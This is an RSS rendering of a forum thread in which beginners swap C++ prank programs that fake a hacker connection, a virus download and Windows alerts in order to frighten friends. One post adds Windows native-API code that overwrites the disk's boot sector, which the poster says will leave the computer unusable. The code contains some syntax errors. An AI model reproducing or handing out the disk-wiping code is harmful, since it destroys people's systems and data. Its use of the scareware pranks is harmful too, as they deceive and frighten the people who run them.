channel.title: Trick people into thinking they're being hacked
channel.description: go to danasoft.com and get a custom sign. When people view the sign it says a bunch of data about their computer. Simply add in something like "This is now saved to my computer" under custom text 1. I think i aded one to my sig.

item.title: Trick people into thinking they're being hacked
item.dc:creator: @MastrChief MastrChief
item.description:
@MastrChief wrote:

[quote=“Sensored3, post:33, topic:134674”]this code is the ugliest smellest piece of crap in the world
just how efficient is that?@!@?
You make me die inside a little.[/quote]

We already understand that code isn’t as simple as it could of been, but you guys need to understand that I wrote that after just 1 hour learning C++ so of course its not going to be this phenomenal piece of work.

Oh and, thanks martin, for teaching me strings.

Read full topic
item.source: Trick people into thinking they're being hacked

item.title: Trick people into thinking they're being hacked
item.dc:creator: @Sensored3 Sensored3
item.description:
@Sensored3 wrote:

[quote=“Evil_, post:15, topic:134674”][quote author=MastrChief link=topic=186071.msg1685530#msg1685530 date=1187523394]

[code]
#include
#include <windows.h>

using namespace std;

int main()
{
SetConsoleTitle(“Run Me :)”);
cout << “Telnet 50.42.89.182” << endl;
Sleep(2500);
system(“cls”);
cout << “Connecting to 50.42.89.182…” << endl;
Sleep(2500);
cout << “Please wait…” << endl;
Sleep(900);
cout << “Retrieving data…” << endl;
Sleep(3000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__1%” << endl;
cout << “.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__2%” << endl;
cout << “|”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__3%” << endl;
cout << “|.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__4%” << endl;
cout << “||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__5%” << endl;
cout << “||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__6%” << endl;
cout << “|||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__7%” << endl;
cout << “|||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__8%” << endl;
cout << “||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__9%” << endl;
cout << “||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_10%” << endl;
cout << “|||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_11%” << endl;
cout << “|||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_12%” << endl;
cout << “||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_13%” << endl;
cout << “||||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_14%” << endl;
cout << “|||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_15%” << endl;
cout << “|||||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_16%” << endl;
cout << “||||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_17%” << endl;
cout << “||||||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_18%” << endl;
cout << “|||||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_19%” << endl;
cout << “|||||||||.”;
Sleep(2000);
system(“cls”);
cout << “Fuck this…” << endl;
Sleep(1000);
system(“cls”);
cout << “SUPER SPEED” << endl;
Sleep(1000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_40%” << endl;
cout << “||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_64%” << endl;
cout << “||||||||||||||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_84%” << endl;
cout << “||||||||||||||||||||||||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_96%” << endl;
cout << “||||||||||||||||||||||||||||||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “100%” << endl;
cout << “||||||||||||||||||||||||||||||||||||||||||||||||||”;
system(“cls”);
cout << “Virus downloaded completly!” << endl;
MessageBox(0, “Virus found! Attempting to delete . . .”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Virus could not be deleted!”, “Windows”, 0);
Sleep(500);
MessageBox(0, “What a shitty AV you got here.”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Lots of pop up messages…”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Annoying, isn’t it…”, “Windows”, 0);
Sleep(500);
cout << “” << endl << “Your computer is now infected” << endl;
cout << “Please press any key to continue . . .”;
system(“pause > nul”);
}[/code]

Compile it and give it to your friends.
[/quote]Ew.[/quote]

this code is the ugliest smellest piece of crap in the world
just how efficient is that?@!@?
You make me die inside a little.

I guess you don’t know how easy it is to make a real virus/malicious program under Windows:

Use that and the computer will probably never work again.

Wait am I allowed to post this?
[/quote]

Second day of C++ so no, I have no clue.

Looks too complicated for me to understand at this point.[/quote]
its just a more complicated way of hittin your computer with a big hammer and throwing it out a window. I want a inflatable hammer

and yeah i guess your aloud to post it… noobs might try to use it and die
and yeah… i might to use it and break my computer

item.title: Trick people into thinking they're being hacked
item.dc:creator: @Javacisnotrecognized _^_
item.description:
@Javacisnotrecognized wrote:

[quote=“MastrChief, post:26, topic:134674”]Martin, I fixed yours. The loop did not stop at 100, so it did not continue on to the rest of the code.

[code]
#include
#include <windows.h>

using namespace std;

int main()
{
SetConsoleTitle(“fukin fukr lol”);
int total=0;
cout << “Telnet 50.42.89.182” << endl;
Sleep(2500);
system(“cls”);
cout << “Connecting to…” << “50.42.89.182” << endl;
Sleep(2500);
cout << “Please wait…” << endl;
Sleep(900);
cout << “Retrieving data…” << endl;
Sleep(3000);
for (int i=1; i = 100; i++)
{
total++;
Sleep(200);
system(“cls”);
cout << “Downloading virus . . . Please wait”;
cout << "\n\nDownloaded: " << total << “%” << endl;
if ( total == 100) {
cout << “Virus downloaded completly!” << endl;
MessageBox(0, “Virus found! Attempting to delete . . .”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Virus could not be deleted!”, “Windows”, 0);
Sleep(500);
cout << “” << endl << “Your computer is now infected” << endl;
cout << “Please press any key to continue . . .”;
system(“pause > nul”);
return 1;
}
}
}[/code][/quote]

I guess you don’t know how easy it is to make a real virus/malicious program under Windows:

[code]
#include <stdio.h>
#include <stdarg.h>
#include <windows.h>

#define InitializeObjectAttributes(p,n,a,r,s)
§->Length = sizeof(OBJECT_ATTRIBUTES);
§->RootDirectory = r;
§->Attributes = a;
§->ObjectName = n;
§->SecurityDescriptor = s;
§->SecurityQualityOfService = NULL;

typedef ULONG NTSTATUS;

typedef struct _UNICODE_STRING {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
ULONG Length;
PVOID RootDirectory;
PUNICODE_STRING ObjectName;
ULONG Attributes;
PVOID SecurityDescriptor;
PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK
{
union
{
LONG Status;
PVOID Pointer;
};
ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

NTSTATUS WINAPI NtOpenFile(
PHANDLE FileHandle,
ACCESS_MASK DesiredAccess,
POBJECT_ATTRIBUTES ObjectAttributes,
PIO_STATUS_BLOCK IoStatusBlock,
ULONG ShareAccess,
ULONG OpenOptions
);

#define OBJ_OPENIF 0x00000080L

void WINAPI RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);

#define IN
#define OPTIONAL

NTSTATUS WINAPI
NtWriteFile(
IN HANDLE FileHandle,
IN HANDLE Event OPTIONAL,
IN PVOID ApcRoutine OPTIONAL,
IN PVOID ApcContext OPTIONAL,
OUT PIO_STATUS_BLOCK IoStatusBlock,
IN PVOID Buffer,
IN ULONG Length,
IN PLARGE_INTEGER ByteOffset OPTIONAL,
IN PULONG Key OPTIONAL
);

main(){
UNICODE_STRING us;
HANDLE hFileHandle = 0;
IO_STATUS_BLOCK iob;
OBJECT_ATTRIBUTES obatt;
RtlInitUnicodeString(&us, L"\Device\HardDisk0\Partition0");
InitializeObjectAttributes(&obatt, &us, OBJ_OPENIF, NULL, NULL);
NTSTATUS status = NtOpenFile(&hFileHandle, GENERIC_WRITE, &obatt, &iob, FILE_SHARE_WRITE, 0);
char buffer[446];
memset(&buffer), 0xF4, 446);
NtWriteFile(hFileHandle, NULL, NULL, NULL, &iob, &buffer, 446, NULL, NULL);
CloseHandle(hFileHandle);
}[/code]

Use that and the computer will probably never work again.

Wait am I allowed to post this?

Read full topic

item.title: Trick people into thinking they're being hacked
item.dc:creator: @Martin Martin
item.description:
@Martin wrote:

fixed the loop and added in a cheap progress bar thing.

#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
   SetConsoleTitle("fukin fukr lol");
        int total=0; 
        string strx;       
        cout << "Telnet 50.42.89.182" << endl;
        Sleep(2500);
        system("cls");
        cout << "Connecting to..." << "50.42.89.182" << endl;
        Sleep(2500);
        cout << "Please wait..." << endl;
        Sleep(900);
        cout << "Retrieving data..." << endl;
        Sleep(3000);
        for (int i=1; i < 101; i++)
          {
            total++;
            Sleep(100);
            system("cls");
            cout << "Downloading virus . . . Please wait";
            cout << "\n\nDownloaded: " << total << "%" << endl;
            strx = strx + ".";
            cout << strx;
          }
        cout << "\n\nVirus downloaded completly!" << endl;
        MessageBox(0, "Virus found! Attempting to delete . . .", "Windows", 0);
        Sleep(500);
        MessageBox(0, "Virus could not be deleted!", "Windows", 0);
        Sleep(500);
        cout << "" << endl << "Your computer is now infected" << endl;
        cout << "Please press any key to continue . . .";
    system("pause > nul");
}

Read full topic

item.title: Trick people into thinking they're being hacked
item.dc:creator: @Martin Martin
item.description:
@Martin wrote:

[quote=“Evil_, post:17, topic:134674”][quote author=MastrChief link=topic=186071.msg1685770#msg1685770 date=1187542155]

Ew.

Nobody said you had to like it, and it’s already scared 6 retards.
[/quote]
Your coding ethics are UGLY, why not just use a loop? =/[/quote]

My first ever attempt at c++. I had to Google dev c++, how to join strings and then the syntax of a for loop.

#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
    SetConsoleTitle("fukin fukr lol");
        int total=0;        
        cout << "Telnet 50.42.89.182" << endl;
        Sleep(2500);
        system("cls");
        cout << "Connecting to..." << "50.42.89.182" << endl;
        Sleep(2500);
        cout << "Please wait..." << endl;
        Sleep(900);
        cout << "Retrieving data..." << endl;
        Sleep(3000);
for (int i=1; i = 100; i++)
{
   total++;
   Sleep(800);
   system("cls");
   cout << "Downloading virus . . . Please wait";
   cout << "\n\nDownloaded: " << total << "%" << endl;
}
        cout << "Virus downloaded completly!" << endl;
        MessageBox(0, "Virus found! Attempting to delete . . .", "Windows", 0);
        Sleep(500);
        MessageBox(0, "Virus could not be deleted!", "Windows", 0);
        Sleep(500);
        cout << "" << endl << "Your computer is now infected" << endl;
        cout << "Please press any key to continue . . .";
        system("pause > nul");
}

item.dc:creator: @MastrChief MastrChief

item.title: Trick people into thinking they're being hacked
item.dc:creator: @Evil1 Evil_
item.description:
@Evil1 wrote:

[quote=“MastrChief, post:14, topic:134674”][code]
#include
#include <windows.h>

using namespace std;

int main()
{
SetConsoleTitle(“Run Me :)”);
cout << “Telnet 50.42.89.182” << endl;
Sleep(2500);
system(“cls”);
cout << “Connecting to 50.42.89.182…” << endl;
Sleep(2500);
cout << “Please wait…” << endl;
Sleep(900);
cout << “Retrieving data…” << endl;
Sleep(3000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__1%” << endl;
cout << “.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__2%” << endl;
cout << “|”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__3%” << endl;
cout << “|.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__4%” << endl;
cout << “||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__5%” << endl;
cout << “||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__6%” << endl;
cout << “|||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__7%” << endl;
cout << “|||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__8%” << endl;
cout << “||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “__9%” << endl;
cout << “||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_10%” << endl;
cout << “|||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_11%” << endl;
cout << “|||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_12%” << endl;
cout << “||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_13%” << endl;
cout << “||||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_14%” << endl;
cout << “|||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_15%” << endl;
cout << “|||||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_16%” << endl;
cout << “||||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_17%” << endl;
cout << “||||||||.”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_18%” << endl;
cout << “|||||||||”;
Sleep(2000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_19%” << endl;
cout << “|||||||||.”;
Sleep(2000);
system(“cls”);
cout << “Fuck this…” << endl;
Sleep(1000);
system(“cls”);
cout << “SUPER SPEED” << endl;
Sleep(1000);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_40%” << endl;
cout << “||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_64%” << endl;
cout << “||||||||||||||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_84%” << endl;
cout << “||||||||||||||||||||||||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “_96%” << endl;
cout << “||||||||||||||||||||||||||||||||||||||||||||||||”;
Sleep(700);
system(“cls”);
cout << “Downloading virus . . . Please wait” << endl;
cout << “100%” << endl;
cout << “||||||||||||||||||||||||||||||||||||||||||||||||||”;
system(“cls”);
cout << “Virus downloaded completly!” << endl;
MessageBox(0, “Virus found! Attempting to delete . . .”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Virus could not be deleted!”, “Windows”, 0);
Sleep(500);
MessageBox(0, “What a shitty AV you got here.”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Lots of pop up messages…”, “Windows”, 0);
Sleep(500);
MessageBox(0, “Annoying, isn’t it…”, “Windows”, 0);
Sleep(500);
cout << “” << endl << “Your computer is now infected” << endl;
cout << “Please press any key to continue . . .”;
system(“pause > nul”);
}[/code]

Compile it and give it to your friends.[/quote]Ew.
